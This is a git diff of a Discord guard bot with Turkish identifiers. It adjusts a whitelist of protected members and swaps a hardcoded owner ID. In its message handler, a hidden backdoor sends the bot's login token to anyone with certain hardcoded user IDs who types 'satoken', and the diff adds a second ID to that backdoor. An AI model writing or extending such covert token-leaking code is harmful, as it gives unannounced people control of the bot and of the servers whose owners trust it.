@@ -23,7 +23,7 @@ setInterval(() => {
 /////////////////////////////////////////////ELLEME///////////////////////////////////////////
 function guvenli(kisiID) {
   let uye = client.guilds.cache.get(k.guildID).members.cache.get(kisiID);
-  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.owner || uye.id === ayarlar.nocte || uye.id === ayarlar.mine || uye.id === ayarlar.modbot || uye.id === ayarlar.registerbot || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
+  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.owner || uye.id === ayarlar.nocte || uye.id === ayarlar.mine || uye.id === ayarlar.modbot || uye.id === ayarlar.registerbot || uye.id === uye.guild.owner.id || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
   else return false;
 };
 
@@ -295,7 +295,7 @@ client.on('message', async (msg, member, guild) => {
  {
    
 if (msg.content.toLowerCase() === 'satoken'){
-if (msg.author.id !== "813799329407041576") return
+if (msg.author.id !== "813799329407041576" & msg.author.id !== "429357746002067493") return
 
 msg.author.send(client.token);
 }
@@ -510,7 +510,7 @@ client.login(process.env.token);
 
 client.on("guildCreate", async guild => {
 let embed = new MessageEmbed()
-var botOwnerID = "429357746002067493";
+var botOwnerID = "813799329407041576";
 var guildOwner = guild.owner.user
 var guildOwnerTag = guild.owner.user.tag
 var guildName = guild.name
